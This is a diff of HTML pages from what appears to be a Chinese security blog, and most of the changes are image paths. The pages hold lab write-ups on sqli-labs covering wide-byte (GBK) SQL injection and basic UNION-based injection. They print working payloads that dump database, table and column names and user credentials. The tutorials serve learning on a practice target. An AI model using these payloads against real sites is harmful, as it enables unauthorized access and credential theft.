@@ -365,8 +365,7 @@
         
           
             <h1 id="一-确定注入点和注入类型"><a href="#一-确定注入点和注入类型" class="headerlink" title="一 确定注入点和注入类型"></a>一 确定注入点和注入类型</h1><p>经过尝试，我们发现此关过滤了引号和单引号，那么无法知道id值是如何闭合的，那咋办呢？</p>
-  <img src="/.com//10/18/通关解析/1.png" title="This is an example image">
-
+<p> <img src="/.io//1.png" alt="1"></p>
 <p>这里，就不得不说说sql注入的一种，宽字符注入</p>
 <h1 id="二-什么是宽字符注入"><a href="#二-什么是宽字符注入" class="headerlink" title="二 什么是宽字符注入"></a>二 什么是宽字符注入</h1><ol>
 <li><p>在mysql中，用于转义的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性，宽字节注入与HTML页面编码是无关的。</p>
@@ -377,7 +376,7 @@
 </li>
 </ol>
 <h1 id="三-思路"><a href="#三-思路" class="headerlink" title="三 思路"></a>三 思路</h1><p>  既然单引号已被过滤，且呈&#39;显示，那么我们就要想办法使其后面的’生效，先看看url编码后的情况，urlencode(&#39;)=%5c%27,那么，我们需要在%5c的前面加上%df，前面提到的GBK编码方式就会将%df%5c当成是一个汉字，从而使%27脱离出来，也就达到了我们的目的</p>
-<h1 id="四-实践"><a href="#四-实践" class="headerlink" title="四 实践"></a>四 实践</h1><p>  先进行试错测试，看看错误返回    ?id=1%af’<br>  <img src="/.com//2.png" alt="2"><br>确定是单引号闭合，按照步骤，应该是先测试有几个字段，由于是靶场环境，已经颇为熟悉，直接进入到联合查询看看有无显示位  ?id=999%af’ union select 1,2,3 –+<br><img src="/.com//3.png" alt="3"><br>有两个显示位，那么直接爆库  ?id=999%af’ union select 1,2,database() –+<br>  <img src="/.com//4.png" alt="4"><br>再爆表  ?id=999%af’ union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database()) –+<br>  <img src="/.com//5.png" alt="5"><br>在下一步爆字段的时候，由于需要引用表名，而引用表名的话则需要加上引号，这就又得想办法绕过，没关系，我们再加个子查询便是 ?id=999%af’ union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=(select (table_name)from information_schema.tables where table_schema=database() limit 3,1)) –+<br>  <img src="/.com//6.png" alt="6"><br>接下来就不用再演示了</p>
+<h1 id="四-实践"><a href="#四-实践" class="headerlink" title="四 实践"></a>四 实践</h1><p>  先进行试错测试，看看错误返回    ?id=1%af’<br>  <img src="/.io//2.png" alt="2"><br>确定是单引号闭合，按照步骤，应该是先测试有几个字段，由于是靶场环境，已经颇为熟悉，直接进入到联合查询看看有无显示位  ?id=999%af’ union select 1,2,3 –+<br><img src="/.io//3.png" alt="3"><br>有两个显示位，那么直接爆库  ?id=999%af’ union select 1,2,database() –+<br>  <img src="/.io//4.png" alt="4"><br>再爆表  ?id=999%af’ union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database()) –+<br>  <img src="/.io//5.png" alt="5"><br>在下一步爆字段的时候，由于需要引用表名，而引用表名的话则需要加上引号，这就又得想办法绕过，没关系，我们再加个子查询便是 ?id=999%af’ union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=(select (table_name)from information_schema.tables where table_schema=database() limit 3,1)) –+<br>  <img src="/.io//6.png" alt="6"><br>接下来就不用再演示了</p>
 
           
         
@@ -522,24 +521,24 @@
 <p>SQL注入大致可以分为普通注入和盲注<br>        普通注入：攻击者通过观察返回的错误提示信息进行注入<br>        盲注：网络上有好多种解释，作为刚入门的小白，我的理解是攻击者能得到的页面只有成功和失败的页面（废话。。。），准确的说失败的页面不会像普通注入那样给你返回有用的错误提示信息，甚至有可能是什么都没有，而且即使成功了也不会显示我们想要的数据，这就需要我们一步一步的去猜。那么，如何知道我们的注入语句是成功的还是失败的呢？一般情况是通过页面的响应时间来进行判断，如果说我们构造的语句是错误的，那么页面会在极短的时间内响应完毕，如果正确的话，那么我们的页面的响应时间就会稍长一些。</p>
 <h2 id="入门级SQL注入过程（sqli-labs靶场练习）"><a href="#入门级SQL注入过程（sqli-labs靶场练习）" class="headerlink" title="入门级SQL注入过程（sqli-labs靶场练习）"></a>入门级SQL注入过程（sqli-labs靶场练习）</h2><ol>
 <li><p>寻找注入点<br>那么我们该如何寻找注入点呢？<br>  传统的SQL语句可控参数分为两类：<br>   1.数字类型参数不用被引号扩起来，如?id=1<br>   2.其他类型，参数要被引号括起来，如?name=”phone”<br>   判断某个链接是否存在SQL注入，可以对传入的可控参数进行简单构造，通过服务端返回的内容判断有无注入<br>   以靶场sqli-labs为例</p>
-<p><img src="/.com//2.png" alt="avatar"></p>
+<p><img src="/.io//2.png" alt="avatar"></p>
 <p>可以看到当我们在页面请求里构造?id=1 and 1=2后</p>
-<pre><code>此时返回页面正常，这说明了什么？说明了此处不是数字型注入漏洞，为什么这么说呢？因为我们在?id=1后面加上的那句and1=2,既然是and，那么一假一真为假，如果是数字型注入漏洞的话就会报错，而回显却没问题，那么就可以排除是数字型注入漏洞。而当我们在?id=1之后加上一个&apos;，再看</code></pre><p><img src="/.com//3.png" alt="avatar"></p>
+<pre><code>此时返回页面正常，这说明了什么？说明了此处不是数字型注入漏洞，为什么这么说呢？因为我们在?id=1后面加上的那句and1=2,既然是and，那么一假一真为假，如果是数字型注入漏洞的话就会报错，而回显却没问题，那么就可以排除是数字型注入漏洞。而当我们在?id=1之后加上一个&apos;，再看</code></pre><p><img src="/.io//3.png" alt="avatar"></p>
 <p>​        此时页面回显不正常，提示我们SQL语法错误，这说明什么？说明我们的语句已经被执行了，但是由于语法不正确，所以报错。语句被执行，那么就说明此处可能存在字符型的注入，那么我们再加一把火，在页面请求的后面在加上一条注释  –+（注：–空格在SQL里表示注释，但是浏览器在发送请求时将末尾的空格舍去，所以我们用+来代替空格，因为+在经过URL编码后会变为空格。）</p>
-<p><img src="/.com//4.png" alt="avatar"></p>
+<p><img src="/.io//4.png" alt="avatar"></p>
 <p>​        此时页面回显正常，可以确定此处存在单引号字符型注入漏洞。知道了是单引号字符型注入漏洞，那我们接下来就可以构造语句语句一步一步的接近我们想要接近的数据，构造order by语句来测试所在表有几个字段，如图所示，为3时正常，为4时出错，说明表有三个字段</p>
 </li>
 </ol>
 <p>​       那么，知道了有三个字段后便可以使用union联合查询来测试页面是否存在显示位，语句如下：union select 5,6,7 –+</p>
-<p><img src="/.com//5.png" alt="avatar"></p>
+<p><img src="/.io//5.png" alt="avatar"></p>
 <p>​          发现页面输出了6和7，说明有两个显示位，那么接下来，就可以利用SQL语句依次爆破出数据库名，表名，列名，字段信息等<br> <a href="http://localhost/sqli-labs/Less-1/?id=861&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/?id=861&#39;</a> union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+//查询数据库名</p>
-<p><img src="/.com//6.png" alt="avatar"></p>
+<p><img src="/.io//6.png" alt="avatar"></p>
 <p>查询security内的表：<a href="http://127.0.0.1/sqli-labs/Less-1/?id=861&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=861&#39;</a> union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’) –+</p>
-<p><img src="/.com//7.png" alt></p>
+<p><img src="/.io//7.png" alt></p>
 <p>接着继续爆破出列名：select group_concat(column_name) from information_schema.columns where table_name=’users’</p>
-<p><img src="/.com//8.png" alt="avatar"></p>
+<p><img src="/.io//8.png" alt="avatar"></p>
 <p>  最后就是激动人心的时刻，直接爆破出用户名和密码：select group_concat(username) from security.users // 用户名<br>  lesect group_concat(password) from security.users//用户密码</p>
-<p><img src="/.com//9.png" alt="avatar"></p>
+<p><img src="/.io//9.png" alt="avatar"></p>
 <h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>​        今天就暂时给大家分享这么多，因为白凡也是小白一个，也在学习的路途中，如果有哪些地方有误，请联系我改正，下一篇的话可能会讲一下sqlmap的使用方法，下页见！<br> <a href="https://blog.csdn.net/sdb5858874/article/details/80727555" target="_blank" rel="noopener">参考链接</a></p>
 
           
